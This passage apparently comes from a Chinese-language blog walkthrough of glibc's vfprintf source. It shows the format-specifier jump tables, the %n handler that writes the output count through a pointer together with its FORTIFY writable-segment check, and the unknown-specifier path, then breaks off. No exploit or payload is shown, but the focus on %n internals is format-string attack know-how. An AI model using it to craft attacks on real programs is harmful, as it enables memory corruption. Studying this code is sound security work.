class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 3b: after processing first &#x27;l&#x27; modifier.  */</span>\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step3b_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> STEP4_TABLE\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 4: processing format specifier.  */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step4_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),       <span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"LABEL-form-number\"><a href=\"#LABEL-form-number\" class=\"headerlink\" title=\"LABEL (form_number)\"></a>LABEL (form_number)</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LABEL (form_number):\t\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span>)\t\t\t\t      \\</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (! readonly_format)\t\t\t\t\t      \\</span><br><span class=\"line\">\t    &#123;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t      <span class=\"keyword\">extern</span> <span class=\"type\">int</span> __readonly_area (<span class=\"type\">const</span> <span class=\"type\">void</span> *, <span class=\"type\">size_t</span>)\t\t      \\</span><br><span class=\"line\">\t\tattribute_hidden;\t\t\t\t\t      \\</span><br><span class=\"line\">\t      readonly_format\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t\t= __readonly_area (format, ((STR_LEN (format) + <span class=\"number\">1</span>)\t      \\</span><br><span class=\"line\">\t\t\t\t\t    * <span class=\"keyword\">sizeof</span> (CHAR_T)));\t      \\</span><br><span class=\"line\">\t    &#125;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (readonly_format &lt; <span class=\"number\">0</span>)\t\t\t\t\t      \\</span><br><span class=\"line\">\t    __libc_fatal (<span class=\"string\">&quot;*** %n in writable segment detected ***\\n&quot;</span>);\t      \\</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"comment\">/* Answer the count of characters written.  */</span>\t\t\t      \\</span><br><span class=\"line\">      <span class=\"type\">void</span> *ptrptr = process_arg_pointer ();\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (is_longlong)\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_long_num)\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">long</span> <span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_char)\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">char</span> *) ptrptr = done;\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!is_short)\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">short</span> <span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;\t\t</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"LABEL-unknow\"><a href=\"#LABEL-unknow\" class=\"headerlink\" title=\"LABEL(unknow)\"></a>LABEL(unknow)</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LABEL (form_unknown):</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (spec == L_(<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The format string ended before the specifier is complete.  */</span></span><br><span class=\"line\">      __set_errno (EINVAL);</span><br><span class=\"line\">      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* If we are in the fast loop force entering the complicated</span></span><br><span class=\"line\"><span class=\"comment\">     one.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>所以继续分析vfprintf 函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span 